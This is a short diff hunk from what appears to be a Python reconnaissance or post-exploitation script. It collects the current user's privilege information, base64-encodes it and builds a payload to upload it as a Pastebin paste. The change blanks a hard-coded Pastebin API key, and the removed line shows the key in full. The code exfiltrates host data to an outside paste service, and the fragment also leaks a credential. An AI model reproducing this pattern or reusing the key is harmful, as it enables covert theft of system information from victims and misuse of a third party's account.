@@ -17,7 +17,7 @@ output +=b'Current User Privileges:   \n'+stdout+b'\n'
 
 
 payload = {
-	'api_dev_key':'oSmrIiqAjqmDEOBvXG6L9BIm8V2Bbksk',
+	'api_dev_key':'',
 	'api_paste_code':base64.b64encode(output),
 	'api_option':'paste'
 }
